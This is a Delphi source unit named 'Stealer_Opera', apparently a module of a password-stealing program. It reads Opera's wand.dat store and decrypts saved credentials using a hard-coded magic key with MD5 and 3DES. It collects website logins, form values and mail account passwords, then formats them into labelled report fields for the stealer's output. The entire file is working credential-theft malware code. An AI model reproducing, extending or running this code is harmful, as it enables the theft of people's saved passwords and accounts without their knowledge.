unit Stealer_Opera;

interface

uses
  Windows, Dialogs, SysUtils, Classes, DCPdes, DCPsha1, DCPmd5;

  function ProcessWandDataMem(M: dword; size: dword):string;

implementation

uses
  Parser;

var
  FormsList: TList;
  AccountList: TList;
  SiteList: TList;

type
  PEmailAccountItem = ^TEmailAccountItem;
  TEmailAccountItem = record
    Email: string;
    Server: string;
    Password: string;
    User: string;
  end;
  
  POperaFormItem = ^TOperaFormItem;
  TOperaFormItem = record
    Site: string;
    Params: TStringList;
  end;

  POperaSiteItem = ^TOperaSiteItem;
  TOperaSiteItem = record
    Site: string;
    User: string;
    Password: string;
  end;

procedure XChg(var Critical, Normal: Integer); assembler;
asm
  mov  ecx, [edx]
  lock xchg [eax], ecx
  mov  [edx], ecx
end;

procedure FreeObject(var O);
var
  OO: TObject absolute O;
  XX: TObject;
begin
  XX := nil;
  XChg(Integer(OO), Integer(XX));
  if XX <> nil then
    TObject(XX).Free;
end;

function AnyValue(const A: array of Ansistring): Ansistring;
var
  i: Integer;
begin
  for i := Low(A) to High(A) do
    if A[i] <> '' then begin
      Result := A[i];
      Exit;
    end;
  Result := '';
end;

procedure DecryptPass(key, data, dataout: Pointer; len: Integer; magic: Pointer; magic_len: Integer);
var
  digest_1: array[0..15] of Byte;
  digest_2: array[0..15] of Byte;
  des_key: array[0..23] of Byte;

  md5: TDCP_md5;
  des: TDCP_3des;
begin
  md5 := TDCP_md5.Create(nil);
  md5.Init;
  md5.Update(magic^, magic_len);
  md5.Update(key^, 8);
  md5.Final(digest_1);
  Move(digest_1, des_key, 16);

  md5.Init;
  md5.Update(digest_1, 16);
  md5.Update(magic^, magic_len);
  md5.Update(key^, 8);
  md5.Final(digest_2);
  md5.Burn;
  md5.Free;

  Move(digest_2, des_key[16], 8);

  des := TDCP_3des.Create(nil);
  des.Init(des_key, 192, @digest_2[8]);
  des.DecryptCBC(data^, dataout^, len);
  des.Burn;
  des.Free;          
end;

function DecryptWandPass(const Key, Data: Ansistring): string;
const
  opera_magic_wand: array[0..10] of Byte = ($83, $7D, $FC, $0F, $8E, $B3, $E8, $69, $73, $AF, $FF);
var
  S: Ansistring;
  d:dword;
  b:byte;
  p:dword;
begin
  Result := '';
  try
    if Length(Key) <> 8 then Exit;
    if (Length(Data) < 8) or (Length(Data) mod 8 <> 0) then Exit;

    SetLength(Result, Length(Data));
    DecryptPass(@Key[1], @Data[1], @Result[1], Length(Data), @opera_magic_wand, SizeOf(opera_magic_wand));
    d:=Length(Result);
    p:=dword(pointer(result))+d-1;
    CopyMemory(@b,pansichar(p),1);
    d:=(d-b) div 2;
    SetLength(Result, d); // Cut unused chars
    Result:=trim(Result);
  except
    Result := '';
  end;
end;

procedure ProcessWandData(M: TMemoryStream);
var
  P: POperaFormItem;
  cVer: Integer;

  function Swap32(Value: LongWord): LongWord; assembler;
  asm
    bswap eax
  end;

  function ReadDWord: LongWord;
  begin
    M.ReadBuffer(Result, 4);
    Result := Swap32(Result);
  end;

  function ReadByte: Byte;
  begin
    M.ReadBuffer(Result, 1);
  end;

  function ReadVariable(CLen: LongWord): Ansistring;
  begin
    if CLen > M.Size then
      raise Exception.Create('Invalid data length');
    SetLength(Result, CLen);
    M.ReadBuffer(Result[1], CLen);
  end;

  procedure Skip(CLen: LongWord);
  begin
    M.Seek(CLen, 1);
  end;

  function ReadStr: string;
  var
    Key, Data: Ansistring;
    Len: Integer;
  begin
    Len := ReadDWord;
    Result := '';
    if Len = 0 then Exit;
    Key := ReadVariable(ReadDWord);
    Data := ReadVariable(ReadDWord);
    Result := DecryptWandPass(Key, Data);
    Len := Len-Length(Key)-Length(Data)-8;
    if Len > 0 then 
      ReadVariable(Len);
  end;

  function ReadSiteHeader: Integer;
  begin
    if cVer >= 6 then begin
      ReadDWord; // Flag
      ReadStr; // Hash
      ReadStr; // Time zone
    end;
    New(P);
    P.Params := TStringList.Create;
    P.Site := ReadStr;
    FormsList.Add(P);
    ReadStr; // Submit name
    if cVer > 3 then begin
      ReadStr; // Alternative name
      ReadStr; // Form target
    end;
    Skip(24);
    Result := ReadDWord; // Number of children
  end;

  procedure ReadSiteItem;
  var
    InputName, InputValue, InputValueHidden: string;
  begin
    ReadByte;
    InputName := ReadStr;
    InputValue := ReadStr;
    InputValueHidden := ReadStr;
    if InputValue = '' then
      InputValue := InputValueHidden;
    if P <> nil then
      P.Params.Add(InputName + '=' + InputValue);
  end;

var
  i, j, total_count, extra_flag: Integer;
  Site, User, Pass: Ansistring;
  PSite: POperaSiteItem;
  PMail: PEmailAccountItem;

const
  CMail = 'opera:mail';

begin
  if M.Size < 16 then Exit;
  cVer := ReadDWord;

   // Version (2 = 6.x, 7.x, 8.x; 3 = 9.0; 4 = 9.1; 5 = 9.12+; 6 = 11.10)
  if (cVer < 2) or (cVer > 6) then begin
    //LogError('Incorrect wand.dat file version: ' + IntToStr(cVer), ModuleName);
    Exit;
  end;

  if ReadDWord <> 0 then begin
    //LogInfo('Skipping wand.dat file because of master password encryption', ModuleName);
    Exit; // 1 - crypted, 0 - not crypted
  end;

  if cVer >= 5 then begin
    ReadVariable(24);
    extra_flag := ReadDWord;
  end else begin
    extra_flag := ReadDWord;
    ReadVariable(4);
  end;

  ReadStr; // Personal profile

  P := nil;
  if extra_flag = 1 then begin
    ReadVariable(1);
    total_count := ReadDWord;
    for i := 0 to total_count-1 do begin
      for j := 0 to ReadSiteHeader-1 do begin
        ReadSiteItem;
      end;
      P^.Site := '';
      FreeObject(P^.Params);
      FormsList.Remove(P);
      Dispose(P);
      P := nil;
    end;
    ReadStr; // Log profile
  end;

  ReadVariable(1);  

  total_count := ReadDWord;
  for i := 0 to total_count-1 do
  begin
    for j := 1 to ReadSiteHeader do
      ReadSiteItem;
    if P.Params.Count = 0 then
    begin
      P^.Site := '';
      FreeObject(P^.Params);
      FormsList.Remove(P);
      Dispose(P);
      P := nil;
    end;
  end;

  total_count := ReadDWord;
  for i := 0 to total_count-1 do
  begin
    if CVer >= 6 then
    begin
      ReadDWORD;
      ReadStr;
      ReadStr;
    end;

    Site := ReadStr;
    User := ReadStr;
    Pass := ReadStr;

    if Copy(Site, 1, Length(CMail)) = CMail then begin
      New(PMail);
      PMail^.Server := Site;
      Delete(PMail^.Server, 1, Length(CMail)+1);
      PMail^.Password := Pass;
      PMail^.User := User;
      AccountList.Add(PMail);
    end else begin
      New(PSite); SiteList.Add(PSite);
      PSite^.Site := Site;
      PSite^.User := User;
      PSite^.Password := Pass;
    end;
  end;
end;

procedure PostProcess;
var
  i, j, c: Integer;
  P1, P2: POperaFormItem;
begin
  i := 0;
  while i < FormsList.Count do begin
    c := 0;
    P1 := FormsList.Items[i];
    for j := i+1 to FormsList.Count-1 do begin
      P2 := FormsList.Items[j];
      if (P1^.Site = P2^.Site) and (P1^.Params.Text = P2^.Params.Text) then begin
        c := 1;
        Break;
      end;
    end;
    if c = 1 then begin
      FormsList.Remove(P1);
      with P1^ do begin
        Site := '';
        FreeObject(Params);
      end;
      Dispose(P1);
      i := i - 1;
    end;
    i := i + 1;
  end;
end;

function DelS(const Value: Ansistring): Ansistring;
begin
  Result := Value;
  if (Length(Result) > 0) and (Result[1] = '*') then
    Delete(Result, 1, 1);
end;

function AsText: string;
var
  i,i2: Integer;
  S1, S2: string;
const
  W1: WideString = 'http://';
  W2: WideString = 'site://';
begin
  Result := '';

  if FormsList.Count > 0 then
  begin
    for i := 0 to FormsList.Count-1 do
    begin
      if POperaFormItem(FormsList[i])^.Params.Count >= 2 then
      begin
        Result:=result + formattype(REPORT_DATA_URL)
                       + POperaFormItem(FormsList[i])^.Site + #13#10;
        for i2:=0 to POperaFormItem(FormsList[i])^.Params.Count-1 do
        begin
          S1 := POperaFormItem(FormsList[i])^.Params[i2];
          S2 := S1;

          if Pos('=', S1) > 0 then
          begin
            S1 := Copy(S1, Pos('=', S1)+1, MaxInt);
            S2 := Copy(S2, 1, Pos('=', S2)-1);
            Result := Result + formattype(REPORT_DATA_VALUE_NAME) + S2 + #13#10
                             + formattype(REPORT_DATA_UKWN) + S1 + #13#10
          end;
        end;
      end;
    end;
  end;

  if SiteList.Count > 0 then begin
    for i := 0 to SiteList.Count-1 do begin
      Result := Result + formattype(REPORT_DATA_BAT_SERVER)
                       + StringReplace(DelS(POperaSiteItem(SiteList[i])^.Site), W1, W2, [])+#13#10
                       + formattype(REPORT_DATA_LOGIN)
                       + POperaSiteItem(SiteList[i])^.User+#13#10
                       + formattype(REPORT_DATA_PWD)
                       + POperaSiteItem(SiteList[i])^.Password+#13#10;
    end;
  end;

  if AccountList.Count > 0 then begin
    for i := 0 to AccountList.Count-1 do begin
      Result := Result + formattype(REPORT_DATA_BAT_SERVER)
                       + AnyValue([PEmailAccountItem(AccountList[i])^.Email, PEmailAccountItem(AccountList[i])^.Server])+#13#10
                       + formattype(REPORT_DATA_LOGIN)
                       + PEmailAccountItem(AccountList[i])^.User+#13#10
                       + formattype(REPORT_DATA_PWD)
                       + PEmailAccountItem(AccountList[i])^.Password + #13#10;
    end;
  end;
end;

function ProcessWandDataMem(M: dword; size: dword):string;
var
  mt: TMemoryStream;
begin
  FormsList := TList.Create;
  AccountList := TList.Create;
  SiteList := TList.Create;
  mt:=TMemoryStream.Create;
  mt.write(pointer(m)^,size);
  mt.Seek(0,0);
  ProcessWandData(mt);
  result:=AsText;
  mt.Free;
end;

end.

